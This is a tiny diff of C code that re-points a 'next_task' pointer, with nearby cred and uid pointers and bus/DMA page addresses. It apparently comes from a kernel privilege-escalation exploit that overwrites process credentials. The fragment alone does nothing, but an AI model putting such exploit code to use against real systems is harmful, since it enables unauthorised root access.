@@ -348,7 +348,7 @@ printf("THERE");
 	printf("asdfasdf");
 	// Data
 #define DATA_ADDRESS (BUS_ADDRESS + 0x3000)
-	vuint32_t *next_task = virtCbPage2 + 0x500;
+	vuint32_t *next_task = virtCbPage3;
 	vuint32_t *cred = next_task + 1;
 	vuint32_t *dummy = cred + 1;
 	vuint8_t *uid = (vuint8_t *)(dummy + 1);
